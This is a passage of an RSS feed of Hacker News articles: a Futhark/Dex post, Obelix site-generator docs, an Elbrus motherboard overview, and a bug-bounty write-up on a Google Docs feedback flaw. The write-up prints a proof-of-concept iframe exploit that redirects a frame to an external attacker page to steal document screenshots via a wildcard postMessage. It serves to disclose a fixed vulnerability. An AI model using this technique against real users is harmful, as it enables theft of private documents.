<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn‚Äôt yet find a Dex example where the effect system was more than a small notational convenience. I‚Äôm sure there‚Äôs one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn‚Äôt figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It‚Äôs really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I‚Äôd be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn‚Äôt matter much for the examples I looked at, Dex‚Äôs type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn‚Äôt have the heart for it. I‚Äôll keep this as a usage case for when we implement AD properly.</p>
<p>I didn‚Äôt look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</a></em></p>]]>
            </description>
            <link>https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559967</guid>
            <pubDate>Mon, 28 Dec 2020 15:36:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Obelix, a simple and extensible static site generator]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25559551">thread link</a>) | @jdormit
<br/>
December 28, 2020 | https://obelix-site-builder.github.io/obelix/ | <a href="https://web.archive.org/web/*/https://obelix-site-builder.github.io/obelix/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        <img src="https://obelix-site-builder.github.io/obelix/images/obelix.jpg" alt="obelix the gaul">
      </p>
      <p>Obelix is a <a href="https://www.netlify.com/blog/2020/04/14/what-is-a-static-site-generator-and-3-ways-to-find-the-best-one/">static site generator</a>. Its primary goals are simplicity, ease of use, and extensibility.</p>
      <p>In a nutshell, a static site generator transforms a set of input data into static assets (HTML, CSS, JavaScript, images, etc.) ready to be served by a web server. The input data can come from a wide variety of sources, from local files on disk to APIs.</p>
      <p>Out of the box, Obelix supports:</p>
      <ul>
        <li><a href="https://commonmark.org/">CommonMark</a>-compliant markdown rendering</li>
        <li>Page and post metadata via <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter</li>
        <li>String templating powered by <a href="https://handlebarsjs.com/">Handlebars</a></li>
        <li>Layout templates to apply a common layout to the whole site or a subdirectory</li>
        <li>List templates to render index pages, feeds, or any other listing of a subdirectory</li>
        <li>A powerful plugin system that allows developers to write JavaScript to pull in data from external APIs, transform existing data before it gets rendered, or anything else you can imagine</li>
      </ul>
      <h2>Installation</h2>
      <p>Obelix is available <a href="https://npmjs.org/obelix">on NPM</a>. It's meant to be installed globally:</p>
      <pre><code>$ sudo npm install -g obelix
</code></pre>
      <h2>Getting started</h2>
      <p>An Obelix site consists of a directory containing the source files for the website and an <code>obelix.json</code> configuration file. At a minimum, this file needs to contain two keys, <code>"src"</code> and <code>"out"</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build"
}
</code></pre>
      <p>The <code>"src"</code> key should be the relative path to the directory where your site's source files live. The <code>"out"</code> key is the relative path to the directory where Obelix will output the built site. For example, the directory for the site described by the <code>obelix.json</code> above might look like this:</p>
      <pre><code>.
‚îú‚îÄ‚îÄ obelix.json
‚îî‚îÄ‚îÄ source
    ‚îú‚îÄ‚îÄ index.md
    ‚îî‚îÄ‚îÄ # all site source files here
</code></pre>
      <p>To build the site, run:</p>
      <pre><code>$ obelix build
</code></pre>
      <p>This will parse through all file in the source directory, transform them as necessary, and render the final site to the output directory (creating it if necessary). Any markdown files will get transformed to HTML, frontmatter and Handlebars template expressions will be processed, and layout and list templates will be applied.</p>
      <p>You can also run:</p>
      <pre><code>$ obelix serve
</code></pre>
      <p>This will start a web server serving your site on port 8080 (by default - pass the <code>-p</code> option to change this). The server will automatically rebuild the site whenever it detects changes to a source file. This is a just a development convenience - the <code>obelix serve</code> server is not production-ready!</p>
      <p>There are a few other keys you can put in <code>obelix.json</code>:</p>
      <ul>
        <li><code>"metadata"</code>: this should be a JSON object containing site metadata. This object will exposed in Handlebars templates as the <code>site</code> key (see below)</li>
        <li><code>"plugins"</code>: An object mapping plugin names to configuration options. More details on this in the Plugins section below</li>
      </ul>
      <h2>Source file configuration</h2>
      <p>All source files in an Obelix site are considered either an <code>asset</code> or a <code>page</code>. A <code>page</code> is a text file (with any file extension) where the beginning of the file contains <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter. YAML frontmatter is used to specify metadata about the page and consists of the characters <code>---</code>, followed by a newline and a YAML document containing data you want, and finally another newline and the closing characters <code>---</code>. For example:</p>
      <pre><code>---
author: Getafix
title: Little-known herbs of Gaul
published: 2020-12-17
tags:
  - blog
  - druidism
---
And then the page content goes here!
</code></pre>
      <p>Obelix performs some default transformations on <code>page</code>-type sources, including expanding Handlebars template expressions and applying layout templates, and exposes these files as data in list templates (more on all this later).</p>
      <p>Any file that does not contain YAML frontmatter, including image or other non-text files, are considered <code>asset</code>-type sources. Obelix does no additional processing on <code>asset</code> files - it just copies them verbatim to the output directory.</p>
      <p><strong>Important</strong>: Even if you have no metadata you want to attach to a page, you need to put YAML frontmatter on it for Obelix to process it. In these cases, you can just put the opening <code>---</code> and closing <code>---</code> with no content in between.</p>
      <p>The source directory structure determines the output directory structure. For example, a source file <code>blob/post1.md</code> would get written to the output directory as <code>blog/post1.html</code>.</p>
      <h2>Template expansion</h2>
      <p><code>Page</code>-type source files can contain <a href="https://handlebarsjs.com/">Handlebars</a> template expressions. Template expressions are delimited by double curly braces - for example, <code>{{ title }}</code>. Any page metadata in the page's frontmatter is available as a variable for use in a template expression, and any site metadata set in <code>obelix.json</code> is available in the <code>site</code> object in template expressions.</p>
      <p>For example, given the following <code>obelix.json</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build",
    "metadata": {
        "publisher": "When In Rome LLC"
    }
}
</code></pre>
      <p>And the following <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
author: Caesar
---
This post was written by {{ author }} and published by {{ site.publisher }}
</code></pre>
      <p>The output file <code>post.html</code> would render like this:</p>
      <pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;This post was written by Caesar and published by When In Rome LLC&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Handlebars offers many additional templating features - see <a href="https://handlebarsjs.com/guide/">the official guide</a> to learn more.</p>
      <h2>Layout templates</h2>
      <p>Layout templates allow you to apply a unified layout to <code>page</code> sources. By default, layout templates are any file named <code>layout.html.hbs</code> or <code>layout.html.handlebars</code>, but these defaults can be overridden by the <code>"layoutTemplates"</code> <code>obelix.json</code> field, which should be an array of layout template names. Individual pages can also specify a <code>template</code> metadata field, which should be the name of the file to use as a layout template for that page. Layout templates apply to all <code>page</code> sources in the same directory they are in and in subdirectories, but if a subdirectory has its own layout template that template overrides the parent layout template. This means you can put a <code>layout.html.hbs</code> at the root of your site that will be applied by default to every <code>page</code> in the site, but you can override that template for individual subdirectories by giving them their own <code>layout.html.hbs</code>.</p>
      <p>A layout template is a Handlebars template that gets passed the content of the page it is applied to as the <code>content</code> key. When rendering a <code>page</code>, if Obelix finds a layout template for that page it will render the layout template and replace the output content with the result.</p>
      <p>An example should make things clearer. Given this <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
---
# My Post
This is some hot content!
</code></pre>
      <p>And this <code>layout.html.hbs</code>:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
       {{{ content }}}
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>The output file <code>post.html</code> would look like this:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
      &lt;h1&gt;My Post&lt;/h1&gt;
      &lt;p&gt;This is some hot content!&lt;/p&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Note the use of triple curly braces in <code>{{{ content }}}</code>. This tells Handlebars not to HTML-escape the result of the expression. See <a href="https://handlebarsjs.com/guide/#html-escaping">here</a> for more info.</p>
      <h2>List templates</h2>
      <p>A list template is like a layout template, but instead of being passed a single page it gets passed a list of pages. List templates can be used to generate index pages, RSS feeds, or any other collection of content. A list template is simply any file with a <code>.hbs</code> or <code>.handlebars</code> file extension that isn't a layout template. Unless you have the <code>"layoutTemplates"</code> configuration option set, this means that any <code>.hbs</code> or <code>.handlebars</code> file that isn't named <code>layout.html.hbs</code>, <code>layout.html.handlebars</code>, or is the target of a <code>template</code> page metadata will be treated as a list template.</p>
      <p>List templates get passed an array of all pages in the same directory as them as the <code>pages</code> variable. Each item in this list is a <code>page</code> object that the one that gets passed to layout templates - it will have a <code>content</code> key containing the page content in addition to any keys in the page frontmatter. The <code>pages</code> array can be iterated over using the <a href="https://handlebarsjs.com/guide/builtin-helpers.html#each">Handlebars <code>each</code> helper</a>:</p>
      <pre><code>&lt;html&gt;
    &lt;body&gt;
      {{#each pages}}
          &lt;h1&gt;{{ title }}&lt;/h1&gt;
          
      {{/each}}
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>If you want to iterate over pages that aren't in the same directory as the list template, you can use the <code>site.pages</code> variable. This variable is a nested array of all pages in the site. The format of <code>site.pages</code> is a little weird: it's a recursive array that can be iterated over to access the pages in the top-level directories, but exposes subdirectories as attributes on that array with values that are themselves recursive arrays. For example, given the following site structure:</p>
      <pre><code>.
‚îú‚îÄ‚îÄ index.md
‚îú‚îÄ‚îÄ about.md
‚îî‚îÄ‚îÄ blog
    ‚îú‚îÄ‚îÄ post1.md
    ‚îî‚îÄ‚îÄ post2.md
</code></pre>
      <p>The <code>site.pages</code> variable would be an array containing <code>index.md</code> and <code>about.md</code>, and <code>site.pages.blog</code> would be an array containing <code>post1.md</code> and <code>post2.md</code>.</p>
      <p>If you have a directory whose name isn't a valid JavaScript identifier, you can access it using index notation, e.g. <code>site.pages["My weird folder"]</code>. Although this layout is a bit unconventional, it makes it convenient to loop through pages using the <code>{{each}}</code> helper at any level in the directory structure.</p>
      <p>List templates can be either <code>page</code> or <code>asset</code> sources. If you include a frontmatter block in a list template, it will be treated as a <code>page</code> and have layout templates applied to it. If not, it will be treated as an <code>asset</code> and layout templates will not be applied to it.</p>
      <p>Tip: Obelix adds a <code>url</code> metadata field to every page by default. This is especially useful in list templates as it lets you construct a link to the pages that the list template is rendering.</p>
      <h2>Data files</h2>
      <p>Source files with a <code>.json</code>, <code>.yaml</code>, or <code>.yml</code> extension are considered data files. Data files are a way to store structured data that isn't meant to be displayed literally. Obelix parses all the data files it finds and passes ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://obelix-site-builder.github.io/obelix/">https://obelix-site-builder.github.io/obelix/</a></em></p>]]>
            </description>
            <link>https://obelix-site-builder.github.io/obelix/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559551</guid>
            <pubDate>Mon, 28 Dec 2020 14:48:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ITX Motherboard with an Elbrus CPU]]>
            </title>
            <description>
<![CDATA[
Score 114 | Comments 87 (<a href="https://news.ycombinator.com/item?id=25559240">thread link</a>) | @jamesmd
<br/>
December 28, 2020 | https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3135">

	

	<div>
		
<h2>ELBRUS MCST History</h2>



<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU‚Äôs have been around for a very long time although unless you‚Äôre from Russia you‚Äôve likely never heard of them. </p><p>They were first released in the early 1970‚Äôs and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>



<h3>Elbrus Timeline</h3>



<ul id="block-082e432c-8cfa-49d3-a848-51fd5247f666"><li><em>Elbrus 1</em>&nbsp;(1973) was the first in the line.<ul><li>A side development was an update of the 1965&nbsp;BESM-6&nbsp;as Elbrus-1K2.</li></ul></li><li><em>Elbrus 2</em>&nbsp;(1977) was a 10-processor computer, considered the first Soviet&nbsp;supercomputer, with superscalar&nbsp;RISC&nbsp;processors. Re-implementation of the Elbrus 1 architecture with faster&nbsp;ECL&nbsp;chips.</li><li><em>Elbrus 3</em>&nbsp;(1986) was a 16-processor computer developed by the Babayan‚Äôs team, and one of the first VLIW computers in the world.</li><li><em>Elbrus 2000</em>&nbsp;(2001) was a microprocessor development of the&nbsp;<em>Elbrus 3</em>&nbsp;architecture. Also known as&nbsp;<em>Elbrus-S</em>.<ul><li><em>Elbrus-3M1</em>&nbsp;(2005) is a two-processor computer based on&nbsp;Elbrus 2000&nbsp;microprocessor working at 300&nbsp;MHz.</li><li><em>Elbrus –ú–í3S1/C</em>&nbsp;(2009) is a&nbsp;ccNUMA&nbsp;four-processor computer based on&nbsp;Elbrus-S&nbsp;microprocessor working at 500&nbsp;MHz.</li></ul></li><li><em>Elbrus-2S+</em>&nbsp;(2011) working at 500&nbsp;MHz, with capacity to calculate 16&nbsp;GFlops.</li><li><em>Elbrus-2SM</em>&nbsp;(2014) working at 300&nbsp;MHz, with capacity to calculate 9.6&nbsp;GFlops.</li><li><em>Elbrus-4S</em>&nbsp;(2014) working at 800&nbsp;MHz, with capacity to calculate 50&nbsp;GFlops.<sup>[1]</sup></li><li><em>Elbrus-1S+</em>&nbsp;(2016) SoC with GPU, working at 600‚Äì1000&nbsp;MHz, with capacity to calculate 24&nbsp;GFlops.</li><li><em>Elbrus-8S</em>&nbsp;(2014‚Äì2015) working at 1300&nbsp;MHz, with capacity to calculate 250&nbsp;GFlops.</li><li><em>Elbrus-8SV</em>&nbsp;(2018) working at 1500&nbsp;MHz, with capacity to calculate 576&nbsp;GFlops.</li><li><em>Elbrus-16S</em>&nbsp;(2019) working at 2000&nbsp;MHz, with capacity to calculate 1.5&nbsp;TFlops.</li></ul>



<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn‚Äôt great and as it couldn‚Äôt fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>



<figure><img src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Elbrus-4C Based PC</figcaption></figure>



<h2>IcepeakITX ELBRUS-8CB Motherboard</h2>



<div><p>The IcepeakITX ELBRUS-8CB Motherboard is the brain child of a group of enthusiasts that banded together to crowdfund a security focused Mini ITX motherboard featuring a 1.5GHZ 8 core Elbrus 8CB CPU and ships with either 8GB or 32GB DDR4 ECC RAM. The board does not ship with a heatsink however it is compatible with any heatsink designed for the Intel LGA3647 socket. </p></div>



<figure><img src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>IcepeakITX ELBRUS-8CB Motherboard</figcaption></figure>



<h2>Full Technical Specifications</h2>



<ul><li><strong>Form-factor:</strong>&nbsp;Mini-ITX</li><li><strong>CPU:</strong>&nbsp;MCST (Moscow Center of SPARC Technologies) Elbrus-8CB 8-core @ 1.5 GHz VLIW (fully compatible with any LGA3647 heatsink)</li><li><strong>SB:</strong>&nbsp;MCST KPI-2 Multicontroller</li><li><strong>RAM:</strong>&nbsp;8 GB or 32 GB (2x [4+1] 8 Gbit/32 Gbit DDR4 DRAM 2400 MHz ECC)</li><li><strong>SATA:</strong>&nbsp;2x M.2_2280 + 4x SATA_6G</li><li><strong>Storage Expansion:</strong>&nbsp;1x microSD (HC)</li><li><strong>Cache:</strong>&nbsp;1x PATA 8 GB (required as cache device for hardware emulation of x86 on Elbrus)</li><li><strong>PCIe:</strong>&nbsp;1x PCIe2_x16 + 1x PCIe2_x1 (as USB3)</li><li><strong>Security:</strong><ul><li>1x TPM SPI connector</li><li>2x boot firmware chip with extra security</li><li>3x heatsink detectors</li><li>1x temperature sensor trigger</li><li>2x tampering sensor</li></ul></li><li><strong>Network:</strong><ul><li>Marvell M88E1111-RCJ chipset</li><li>1x 1G_SFP</li><li>3x 1G_RJ45</li></ul></li><li><strong>GPS:</strong>&nbsp;GPS chip with internal antenna port</li><li><strong>USB:</strong><ul><li>2x USB 2.0 (rear)</li><li>4x USB 2.0 (+PD) (rear)</li><li>2x USB 3.0 (rear)</li><li>1x USB 2.0 (internal)</li></ul></li><li><strong>COM:</strong>&nbsp;1x COM header (internal) required for debugging boot</li><li><strong>Debug:</strong>&nbsp;1x 6-pin debug port, 1x 4-pin (USB to GPIO)</li><li><strong>Video:</strong>&nbsp;2x HDMI (1 HDMI per SM768/256 MB)</li><li><strong>Audio:</strong>&nbsp;Integrated simple audio codec (Linux-compatible)</li><li><strong>Additional Sensors:</strong><ul><li>Fall detection sensor</li><li>Gyroscope</li><li>Water sensor</li></ul></li><li><strong>Additional Connectors:</strong><ul><li>2x PWM-4</li><li>RTC battery connector</li><li>Simple BEEP connector</li></ul></li><li><strong>PCB:</strong>&nbsp;14 layers (level 5 accuracy) / ISOLA Hi Tg 180</li></ul>



<div><p>The Motherboard is also fully opensource and after funding the board schematics and design specifications will be released on github. </p><p>Crowdfunding for the IcepeakITX ELBRUS-8CB is expected to go live early next year via crowdsupply. More details can be found <a href="https://www.crowdsupply.com/sra-centr8/icepeakitx-elbrus-8cb" target="_blank" rel="noreferrer noopener">here</a>. </p><p>Check out more interesting tech coming to crowdfunding sites <a href="https://blog.jmdawson.co.uk/category/crowdfunding/">here</a>.</p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559240</guid>
            <pubDate>Mon, 28 Dec 2020 14:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing private documents through a bug in Google Docs]]>
            </title>
            <description>
<![CDATA[
Score 299 | Comments 137 (<a href="https://news.ycombinator.com/item?id=25559063">thread link</a>) | @hackerpain
<br/>
December 28, 2020 | https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/ | <a href="https://web.archive.org/web/*/https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://savebreach.com/content/images/size/w300/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 300w,
                            https://savebreach.com/content/images/size/w600/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 600w,
                            https://savebreach.com/content/images/size/w1000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 1000w,
                            https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png" alt="Stealing your private documents through a bug in Google Docs">
            </figure>

            <section>
                <div>
                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process ‚Äì </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads ‚Äì the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter. He is one of the top researchers in the Google VRP program. This bug was first documented by KL Sreeram on his <a href="https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/">blog</a>.</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to SaveBreach | Cyber Security, InfoSec, Bug Bounty &amp; Domain Names</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559063</guid>
            <pubDate>Mon, 28 Dec 2020 13:35:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Recurring reviews to track the whole lifecycle of a product]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 55 (<a href="https://news.ycombinator.com/item?id=25558891">thread link</a>) | @hubraumhugo
<br/>
December 28, 2020 | https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product | <a href="https://web.archive.org/web/*/https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558891</guid>
            <pubDate>Mon, 28 Dec 2020 13:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Images of the the samples returned to earth from the asteroid Ryugu]]>
            </title>
            <description>
<![CDATA[
Score 489 | Comments 128 (<a href="https://news.ycombinator.com/item?id=25558874">thread link</a>) | @naetius
<br/>
December 28, 2020 | http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/ | <a href="https://web.archive.org/web/*/http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/">archive.org</a>
